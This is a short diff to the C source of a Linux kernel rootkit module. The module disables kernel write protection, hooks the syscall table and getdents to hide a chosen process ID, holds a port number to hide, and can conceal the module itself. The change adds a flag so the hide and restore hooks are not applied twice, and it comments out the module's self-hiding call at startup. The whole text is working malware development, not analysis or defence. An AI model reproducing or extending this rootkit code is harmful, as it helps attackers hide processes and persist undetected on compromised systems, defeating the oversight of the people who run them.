@@ -30,6 +30,7 @@ MODULE_LICENSE("GPL");
 #define SHOW_PROC_CMD   "show_proc"
 
 long proc_pid;
+bool proc_hidden = false;
 int PORT_TO_HIDE = 631;
 int TCP_fd = -10;
 static struct proc_dir_entry *proc_file;
@@ -266,9 +267,12 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
   {
     proc_pid = str_to_lng(buff2);
     printk("HIDING PID %lld\n", proc_pid);
-    disable_write_protection();
-    hack_getdents();
-    enable_write_protection();
+    if(!proc_hidden){
+      disable_write_protection();
+      hack_getdents();
+      enable_write_protection();
+      proc_hidden = true;
+    } 
     return count;
   }
 
@@ -276,9 +280,12 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
   {
     proc_pid = str_to_lng(buff2);
     printk("SHOWING PID %lld\n", proc_pid);
-    disable_write_protection();
-    restore_getdents();
-    enable_write_protection();
+    if(proc_hidden){
+      disable_write_protection();
+      restore_getdents();
+      enable_write_protection();
+      proc_hidden = false;
+    }
     return count;
   }
 
@@ -354,7 +361,7 @@ void show_module(void) {
 }
 
 static int init(void) {
-  hide_module();
+  // hide_module();
   printk("\nModule starting...\n");
   syscall_table = (unsigned long long*) find();
   if ( syscall_table != NULL ) {
